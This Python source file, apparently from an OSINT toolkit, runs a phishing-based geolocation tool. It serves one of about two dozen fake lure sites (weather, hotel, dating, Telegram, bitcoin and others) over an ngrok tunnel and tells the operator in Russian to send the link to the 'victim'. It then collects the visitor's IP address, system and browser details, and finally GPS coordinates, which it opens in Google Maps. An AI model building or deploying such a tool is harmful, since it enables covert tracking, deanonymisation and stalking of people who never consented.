# by bafomet
import os
import time
import json
import platform
import webbrowser
from pyngrok import ngrok
from subprocess import Popen
from module.utils import COLORS
from module.utils.banner import show_banner
from module.utils.ban import page_23
from osintsan import api

ngrok.set_auth_token = api['ngrok.set_auth_token']

sysname = platform.uname()[0]

stat_file_ip = 0


def wiki():
    temp = "wiki"
    result_file = open("module/db/getloc/" + temp + "/result.json", "w")
    result_file.write("")
    result_file.close()
    # ---------------------------------------------------------------
    info_file = open("module/db/getloc/" + temp + "/info.json", "w")
    info_file.write("")
    info_file.close()

    # ---------------------------------------------------------------
    def deafult_server():
        try:
            with open("module/db/location_log.log", "w") as deafult:
                Popen(('php', '-S', 'localhost:9000', '-t', 'module/db/getloc/' + temp), stdout=deafult, stderr=deafult)
            # Block until CTRL-C or some other terminating event
            a = ngrok.connect(9000, "http", auth_token=ngrok.set_auth_token)
            print(f' {COLORS.REDL}----------------------------------------------------------------------------------\n')
            print(
                f' {COLORS.OKNL}Функция ловли долбаебов переходящих по ссылкам запущена, выбранный сайт активирован.\n')
            print(f"{COLORS.OKNL}" + str(a).replace('"', '').replace("NgrokTunnel:", "").replace("http://", "https://"))
            print(f"\n {COLORS.REDL}Отправте ссылку жертве ...")
        except KeyboardInterrupt:
            print(" Shutting down server.")
            ngrok.kill()
            return

    deafult_server()

    def info():
        global stat_file_ip
        if not str(os.stat('module/db/getloc/' + temp + '/info.json').st_size) == stat_file_ip:
            stat_file_ip = str(os.stat('module/db/getloc/' + temp + '/info.json').st_size)
            file_ip = open('module/db/getloc/' + temp + '/info.json', "r")
            i = file_ip.read()
            try:
                infor = json.loads(i)
                for value in infor['dev']:
                    print(f' {COLORS.REDL}Ухх данные получены, капитан америка фиг такое выкинет,\n')
                    print(f' {COLORS.WHSL}Шутка о сборе данных \n')
                    print(f" {COLORS.WHSL}IP address жертвы    :{COLORS.GNSL}   " + value['Os-Ip'])
                    print(f" {COLORS.WHSL}Операционная система :{COLORS.GNSL}   " + value['Os-Name'])
                    print(f" {COLORS.WHSL}Версия системы       :{COLORS.GNSL}   " + value['Os-Version'])
                    print(f" {COLORS.WHSL}Количество ядер      :{COLORS.GNSL}   " + value['CPU-Core'])
                    print(f" {COLORS.WHSL}Название браузера    :{COLORS.GNSL}   " + value['Browser-Name'])
                    print(f" {COLORS.WHSL}Версия Браузера      :{COLORS.GNSL}   " + value['Browser-Version'])
                    print(f" {COLORS.WHSL}Архитектура ЦП       :{COLORS.GNSL}   " + value['CPU-Architecture'])
                    print(f" {COLORS.WHSL}Разрешение экрана    :{COLORS.GNSL}   " + value['Resolution'])
                    print(f" {COLORS.WHSL}Временная зона       :{COLORS.GNSL}   " + value['Time-Zone'])
                    print(f" {COLORS.WHSL}Язык системы         :{COLORS.GNSL}   " + value['Language'])
                    file_recv = open("module/db/getloc/" + temp + "/info.json", "w")
                    print(f'\n {COLORS.REDL}Отлично, теперь ждем когда цель нажмет на любую кнопку на сайте\n')
                    file_recv.write("")
                    file_recv.close()

            except:
                print("")

    def recv_loc():
        global stat_file_ip
        if not str(os.stat('module/db/getloc/' + temp + '/result.json').st_size) == stat_file_ip:
            stat_file_ip = str(os.stat('module/db/getloc/' + temp + '/result.json').st_size)
            file_ip = open('module/db/getloc/' + temp + '/result.json', "r")
            i = file_ip.read()
            try:
                infor = json.loads(i)
                for value in infor['info']:
                    urls = [
                        "https://www.google.com/maps/",
                        "https://earth.google.com/web/",
                        "https://www.openstreetmap.org/",
                    ]
                    for url in urls:
                        webbrowser.open(url)
                    print('\n Вам необходимо ввести координаты в поиске на трех открывшихся сайтах')
                    print("\n Координаты цели: " f"Широта - {value['lat']} Долгота - {value['lon']}")
                    print("\n Google карты link: "  f"https://www.google.com/maps/place/{value['lat']}+{value['lon']}")
                    print("\n Геолокация получена. ")

                    file_recv = open("module/db/getloc/" + temp + "/result.json", "w")
                    file_recv.write("")
                    file_recv.close()

            except:
                print("")

    while True:
        info()
        recv_loc()


#  Геолокация

def location():
    print(page_23)
    try:
        input_loc = input(f"{COLORS.REDL} └──> {COLORS.WHSL} Введите номер опции: {COLORS.GNSL}")

        if input_loc == "1":
            temp = "nearyou"

        elif input_loc == "2":
            temp = "weather"

        elif input_loc == "3":
            temp = "hotel"

        elif input_loc == "4":
            temp = "air"

        elif input_loc == "5":
            temp = "youtube"

        elif input_loc == "6":
            temp = "postman"

        elif input_loc == "7":
            temp = "telegram"

        elif input_loc == "8":
            temp = "prostitynder"

        elif input_loc == "9":
            temp = "jobs"

        elif input_loc == "10":
            temp = "bitcoin"

        elif input_loc == "11":
            temp = "bloger"

        elif input_loc == "12":
            temp = "coder"

        elif input_loc == "13":
            temp = "data"

        elif input_loc == "14":
            temp = "photo"

        elif input_loc == "15":
            temp = "ngrok"

        elif input_loc == "16":
            temp = "tynder"

        elif input_loc == "17":
            temp = "flirt"

        elif input_loc == "18":
            temp = "tyrizm"

        elif input_loc == "19":
            temp = "restoran"

        elif input_loc == "20":
            temp = "taiga_game"

        elif input_loc == "21":
            temp = "friend"

        elif input_loc == "22":
            temp = "exchange"

        elif input_loc == "23":
            temp = "sharing"

        elif input_loc == "24":
            temp = "amigos"

        elif input_loc == "99":
            show_banner(clear=True)
            return

        else:
            print(f'\n{COLORS.REDL} Неверный ввод номера опции ...')
            time.sleep(2)
            show_banner(clear=True)
            return

    except:
        print("")
        return

    result_file = open("module/db/getloc/" + temp + "/result.json", "w")
    result_file.write("")
    result_file.close()
    # ---------------------------------------------------------------
    info_file = open("module/db/getloc/" + temp + "/info.json", "w")
    info_file.write("")
    info_file.close()

    # ---------------------------------------------------------------

    def deafult_server():
        try:
            with open("module/db/location_log.log", "w") as deafult:
                Popen(('php', '-S', 'localhost:8767', '-t', 'module/db/getloc/' + temp), stdout=deafult, stderr=deafult)
            # Block until CTRL-C or some other terminating event
            a = ngrok.connect(8767, "http", auth_token=ngrok.set_auth_token)
            print(f' {COLORS.REDL}----------------------------------------------------------------------------------\n')
            print(
                f' {COLORS.OKNL}Функция ловли долбаебов переходящих по ссылкам запущена, выбранный сайт активирован.\n')
            print(f"{COLORS.OKNL}" + str(a).replace('"', '').replace("NgrokTunnel:", "").replace("http://", "https://"))
            print(f"\n {COLORS.REDL}Отправте ссылку жертве ...")
        except KeyboardInterrupt:
            print(" Shutting down server.")
            ngrok.kill()
            return

    deafult_server()

    # Collect events until released

    def info():
        global stat_file_ip
        if not str(os.stat('module/db/getloc/' + temp + '/info.json').st_size) == stat_file_ip:
            stat_file_ip = str(os.stat('module/db/getloc/' + temp + '/info.json').st_size)
            file_ip = open('module/db/getloc/' + temp + '/info.json', "r")
            i = file_ip.read()
            try:
                infor = json.loads(i)
                for value in infor['dev']:
                    print(f'                 {COLORS.REDL}Жертва попалась \n')
                    print(f" {COLORS.WHSL}IP address жертвы    :{COLORS.GNSL}   " + value['Os-Ip'])
                    print(f" {COLORS.WHSL}Операционная система :{COLORS.GNSL}   " + value['Os-Name'])
                    print(f" {COLORS.WHSL}Версия системы       :{COLORS.GNSL}   " + value['Os-Version'])
                    print(f" {COLORS.WHSL}Количество ядер      :{COLORS.GNSL}   " + value['CPU-Core'])
                    print(f" {COLORS.WHSL}Название браузера    :{COLORS.GNSL}   " + value['Browser-Name'])
                    print(f" {COLORS.WHSL}Версия Браузера      :{COLORS.GNSL}   " + value['Browser-Version'])
                    print(f" {COLORS.WHSL}Архитектура ЦП       :{COLORS.GNSL}   " + value['CPU-Architecture'])
                    print(f" {COLORS.WHSL}Разрешение экрана    :{COLORS.GNSL}   " + value['Resolution'])
                    print(f" {COLORS.WHSL}Временная зона       :{COLORS.GNSL}   " + value['Time-Zone'])
                    print(f" {COLORS.WHSL}Язык системы         :{COLORS.GNSL}   " + value['Language'])
                    file_recv = open("module/db/getloc/" + temp + "/info.json", "w")
                    print(f'\n {COLORS.REDL}Отлично, теперь ждем когда цель нажмет на любую кнопку на сайте\n')
                    file_recv.write("")
                    file_recv.close()

            except:
                print("")

    def recv_loc():
        global stat_file_ip
        if not str(os.stat('module/db/getloc/' + temp + '/result.json').st_size) == stat_file_ip:
            stat_file_ip = str(os.stat('module/db/getloc/' + temp + '/result.json').st_size)
            file_ip = open('module/db/getloc/' + temp + '/result.json', "r")
            i = file_ip.read()
            try:
                infor = json.loads(i)
                for value in infor['info']:
                    print(
                        f"\n{COLORS.WHSL} Координаты цели:{COLORS.GNSL} " f"Широта - {value['lat']} Долгота - {value['lon']}")
                    print(f"\n https://www.google.com/maps/place/{value['lat']}+{value['lon']}")
                    webbrowser.open(f"https://www.google.com/maps/place/{value['lat']}+{value['lon']}")
                    webbrowser.open(f"https://earth.google.com/web/search/{value['lat']}+{value['lon']}")
                    print(f"\n {COLORS.FIOL}Сайты с геолокацией открыты")
                    file_recv = open("module/db/getloc/" + temp + "/result.json", "w")
                    file_recv.write("")
                    file_recv.close()

            except:
                print("")

    while True:
        info()
        recv_loc()
